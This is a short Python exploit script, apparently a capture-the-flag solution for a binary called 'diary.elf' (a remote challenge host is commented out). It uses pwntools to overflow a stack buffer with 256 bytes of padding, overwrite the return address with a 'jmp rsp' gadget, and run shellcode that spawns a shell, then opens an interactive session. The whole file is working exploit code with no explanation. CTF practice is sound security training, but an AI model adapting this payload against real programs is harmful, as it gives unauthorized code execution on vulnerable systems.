#!/usr/bin/env python3

from pwn import *

elf = ELF("./diary.elf")

# s  = remote("challs.tfcctf.com", 30812)
s = process(elf.path)

def main():

	# stack is RWX
	jmp_rsp = 0x000000000040114a
	shellcode = asm(shellcraft.amd64.sh(), arch='amd64')

	pl = flat(
		cyclic(256),
		p64(0xdeadface),		# rbp
		# p64(elf.sym.main)		# PoC
		p64(jmp_rsp),
		shellcode
	)
	s.sendline(pl)
	s.interactive()

if __name__=="__main__":
	main()